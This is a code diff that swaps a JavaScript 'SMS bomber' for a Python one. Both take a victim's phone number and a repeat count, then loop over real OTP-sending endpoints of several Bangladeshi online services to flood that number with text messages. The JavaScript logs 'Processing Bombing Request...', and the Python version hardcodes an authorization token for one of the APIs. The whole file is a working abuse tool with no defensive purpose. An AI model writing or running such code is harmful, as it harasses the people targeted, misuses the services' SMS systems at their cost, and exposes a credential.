@@ -1,55 +1,25 @@
-// Author: Shayer Mahmud Sowmik [ Ign0r3dH4x0r ]
-// Removing credit won't make you a cool programmer xD
+import requests
+from requests.structures import CaseInsensitiveDict
+number=input("Enter Number: ")
+amo=int(input("Enter Amo: "))
 
-$(document).ready(() => {
-
-    $(document).on('click', '#send', function (e) {        
-        e.preventDefault();
-        $('#logs').addClass('visually-hidden');
-        var amount = $("#amount").val();
-        var mobile = $("#mobile").val();
-        if (amount > 0 && mobile.length == 11) {
-            var c = 0;
-
-            const APIS = [
-                {
-                    method: "GET",
-                    url: `http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-${mobile}/operator-Robi/send`,
-                },
-                {
-                    method: 'POST',
-                    url: "http://robi.api.bongobd.com/api/login/send-otp",
-                    body: `msisdn=88${mobile}&operator=all`
-                },
-                {
-                    method: 'GET',
-                    url: `http://45.114.85.19:8080/v3/otp/send?msisdn=88${mobile}`
-                },
-                {
-                    method: 'GET',
-                    url: `https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO=${mobile}&countryPhoneCode=%2B88`
-                },
-                {
-                    url: "https://ss.binge.buzz/otp/send/login",
-                    method: "POST",
-                    body: `phone=${mobile}`
-                }
-
-            ];
-
-            while (c < amount) {
-                APIS.forEach(API => {
-                    $.ajax(API);
-                    c += 1;
-                });
-            }
-            $('#logs').removeClass('visually-hidden');
-            $('#logs').text("Processing Bombing Request...");
+url = "https://www.pickaboo.com/rest/all/V1/sendotp?resend=0&storeId=1&mobile="+number+"&eventType=customer_signup_otp"
 
 
-        } else {
-            $('#logs').removeClass('visually-hidden');
-            $('#logs').text("Invalid Number or Amount is null");
-        }
-    });
-})
+url1="http://45.114.85.19:8080/v3/otp/send?msisdn=88"+number
+
+
+url4 = "https://prodapi.swap.com.bd/api/v1/send-otp/login?mobile_number=88"+number+"&referral=false"
+
+headers4 = {"x-authorization":"QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3","Content-Type":"application/json"}
+
+
+
+for i in range(amo):
+    x=requests.post(url4,headers=headers4)
+    print("sent")
+    resp = requests.post(url)
+    print(resp.text)
+    resp=requests.get(url1)
+    print(resp.text)
+    print("\n",i+1,"\n")
